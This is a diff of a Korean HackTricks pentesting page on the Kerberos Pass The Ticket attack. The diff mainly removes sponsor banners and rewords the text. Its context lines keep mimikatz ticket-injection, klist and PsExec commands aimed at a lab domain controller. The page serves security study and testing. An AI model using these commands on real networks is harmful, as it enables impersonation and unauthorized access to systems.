@@ -2,19 +2,11 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-<figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>
-
-\
-[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=pass-the-ticket)를 사용하여 세계에서 **가장 진보된** 커뮤니티 도구로 구동되는 **워크플로우**를 쉽게 구축하고 **자동화**하세요.\
-오늘 바로 액세스하세요:
-
-{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=pass-the-ticket" %}
-
 ## Pass The Ticket (PTT)
 
-**Pass The Ticket (PTT)** 공격 방법에서 공격자는 **사용자의 인증 티켓**을 비밀번호나 해시 값 대신 **탈취**합니다. 이 탈취된 티켓은 **사용자를 가장하는 데** 사용되어 네트워크 내의 리소스와 서비스에 무단으로 접근하게 됩니다.
+**Pass The Ticket (PTT)** 공격 방법에서 공격자는 **사용자의 인증 티켓을 훔칩니다**. 이 훔친 티켓은 **사용자를 가장하는 데 사용되어** 네트워크 내의 리소스와 서비스에 무단으로 접근하게 됩니다.
 
-**읽어보세요**:
+**읽기**:
 
 - [Windows에서 티켓 수집하기](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
 - [Linux에서 티켓 수집하기](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)
@@ -44,16 +36,8 @@ mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.k
 klist #List tickets in cache to cehck that mimikatz has loaded the ticket
 .\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
 ```
-## References
+## 참고 문헌
 
 - [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
-
-<figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>
-
-\
-[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=pass-the-ticket)를 사용하여 세계에서 **가장 진보된** 커뮤니티 도구로 구동되는 **워크플로우**를 쉽게 구축하고 **자동화**하세요.\
-오늘 바로 액세스하세요:
-
-{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=pass-the-ticket" %}
 
 {{#include ../../banners/hacktricks-training.md}}
